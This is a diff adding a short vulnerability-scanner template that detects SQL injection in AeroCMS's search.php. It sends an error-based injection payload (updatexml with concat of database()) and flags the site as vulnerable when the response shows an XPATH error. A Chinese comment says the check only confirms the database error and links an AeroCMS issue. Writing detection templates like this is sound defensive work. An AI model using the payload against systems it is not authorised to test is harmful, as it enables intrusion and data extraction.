@@ -1,0 +1,13 @@
+name: aerocms-search-sql
+rules:
+  r0:
+    request:
+      method: POST
+      path: /search.php
+      body: |
+        search=%1'and updatexml(1,concat(0x7e,database(),0x7e),0)#
+    expression: response.status == 200 &&  response.body.bcontains(b'Query failed XPATH syntax error:')
+expression: r0()
+detail:
+  links:
+    - POC偷懒了只是看一下数据库报错https://github.com/MegaTKC/AeroCMS/issues/8
